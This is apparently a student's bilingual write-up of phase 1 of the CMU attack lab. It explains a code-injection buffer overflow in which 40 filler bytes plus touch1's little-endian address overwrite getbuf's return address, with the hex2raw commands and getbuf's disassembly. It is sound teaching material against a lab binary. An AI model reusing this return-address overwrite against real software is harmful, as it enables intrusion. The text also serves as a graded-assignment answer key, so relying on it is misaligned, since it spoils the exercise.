## Description
- 分为两种attack: 1)Code Injection Attacks 2)Return-Oriented Programming
- 由于executable program的执行逻辑是要上传到CMU评分系统，我们自己本地做的时候要在command line 填入 -q，否则会有authetication error
- gdb -tui ctarget / run -q


## phase_1
- code injection attack, 将touch_1函数的地址(0x4017c0)覆盖掉getbuf调用后返回的return value
- sub $0x28, %rsp 在栈上开辟了40bytes的空间，return value 就存储在 %rsp + 0x28为起始地址的位置
- 所以我么只需要利用hex2raw生成40bytes的dummy string + 函数touch_1的little-endian形式的地址即可
- 答案: input.txt 中 40 *aa c0 17 40, ./hex2raw < input.txt > stage1.txt
- ./target < stage1.txt 即可通过

![](touch1.png)

```
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    $0x28,%rsp
  4017ac:       48 89 e7                mov    %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
  4017b9:       48 83 c4 28             add    $0x28,%rsp
  4017bd:       c3                      retq
  4017be:       90                      nop
  4017bf:       90                      nop
```